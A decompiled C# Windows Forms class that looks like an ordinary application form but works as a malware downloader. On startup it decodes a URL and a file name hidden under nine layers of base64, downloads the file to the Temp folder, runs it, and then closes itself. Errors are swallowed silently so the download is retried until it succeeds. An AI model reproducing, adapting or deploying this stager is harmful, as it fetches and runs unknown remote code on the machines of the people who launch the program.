using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class Form1 : Form
{
	public IContainer components;

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	public Form1()
	{
		ServStart();
	}

	private void ServStart()
	{
		while (true)
		{
			try
			{
				string text = "";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(aK70B7WKc4P5("Vm0weGQxSXhiRmRYV0d4VVYwZG9XRll3WkZOVU1WcHpXa2M1VjJKSGVGWlZiVEZIWVd4S2MxTnNXbFppVkZaeVZteGtTMUl4VG5OWGJGcFhaV3hhZVZkV1VrZFpWMUpJVm10a1lWSnRhRmxWTUZaTFYxWmtXR1JIZEZSTlZtdzBWa2MxUzFZeVNrZFhia0pXWVd0d2RsWXhXbHBsUm1SMFVtMW9UbFpYZHpCV1ZFa3hVakZhU0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlVaVFRWWmFlVnBGV2xOVWJVcEdZMFZ3VjJKVVJYZFpla1pyVTBaT2NtSkdTbWxTTW1oWFZtMHhORmxXYkZkalJtUllZbFZhVlZWcVJtRlRSbHBJVFZoT2FGWnNjSGxXTVdoM1ZqRktSbGR0YUZkaGExcGhXbFZhYTJOc1pITmhSMnhUVm01Q1dsWXhXbE5TTWxGNFZHdGtWbUpIYUhOVmFrNVRZMVpzY21GRlRsUlNiR3cxV1ROd1IxWXdNWEpqUm5CWVlXczFjbFpxU2t0WFYwWkhWV3hhYkdFeGNEWldiWEJIWVRKT2MyTkZaRlppVjNodlZGWm9RMWxXV1hoYVJFSmFWbXN4TkZZeGFHOWhiRXBYVjJ4T1YyRXhXbWhaTVZwaFpFZFdTVnBHWkdsU2JIQmFWMnhXYjJFeVJrZFRXR1JxVW01Q1dGWnRlRXRTUmxweFVtdDBhazFYVWpGVk1uaHJZVWRGZWxGcmJGaFdSWEEyV2xWYVdtVkdaSFZVYlhCVFRUSm9kbFpHV205Uk1WWlhWMWhzYkZJelVsQlZiWE40VGxaYVNHVkhkRmRpVlhCNVZHeGFhMWR0UlhoWGFrNVhVa1ZhZWxZeFpFOVNNVkp5VDFaa2FWSnRPVE5XYTFwWFlqSkplRmRzV2s1WFJYQlpXVzB4TkZkR1VsaGpSbVJUVW14c00xWXllSGRpUjBwR1YyNXdXR0V5VWtoV2FrRjNaREExUlZGc1pHbFhSa3BZVmtkNFlWZHRWa2RYYmxaV1lrVTFjRlZxU205V1ZscDBUbGhrYW1GNlJsaFdNalZIVmtkR2MxTnVRbFZXYkZWNFZGVmFZVmRIVmtoa1IyaHBVbGhCZDFkc1ZtcE9WbHAwVW01S1QxZEZXbFpVVmxaV1RsWldSMUpVYkZGVlZEQTU="), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\" + aK70B7WKc4P5("Vm0wd2QyVkZOVWRXV0doVlYwZG9XVll3WkRSWFJteHlXa2M1VjAxWGVEQmFWVll3VjBaS2RHVkVRbFZXYkVwVVZteGtTMU5IVmtsalJtUk9ZbTFuZWxaclpEUlRNbEpIVm01V2FsSnNjSEJWYlhSM1RteGFjMWR0UmxkTlZuQlhWRlpXVjJGSFZuRlJWR3M5"));
				Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\" + aK70B7WKc4P5("Vm0wd2QyVkZOVWRXV0doVlYwZG9XVll3WkRSWFJteHlXa2M1VjAxWGVEQmFWVll3VjBaS2RHVkVRbFZXYkVwVVZteGtTMU5IVmtsalJtUk9ZbTFuZWxaclpEUlRNbEpIVm01V2FsSnNjSEJWYlhSM1RteGFjMWR0UmxkTlZuQlhWRlpXVjJGSFZuRlJWR3M5"));
				Application.DoEvents();
				ProjectData.EndApp();
				break;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private string aK70B7WKc4P5(string string_0)
	{
		object obj = Convert.FromBase64String(string_0);
		object @string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		@string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		@string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		@string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		@string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		@string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		@string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		@string = Encoding.UTF8.GetString((byte[])obj);
		obj = Convert.FromBase64String(Conversions.ToString(@string));
		return Encoding.UTF8.GetString((byte[])obj);
	}
}
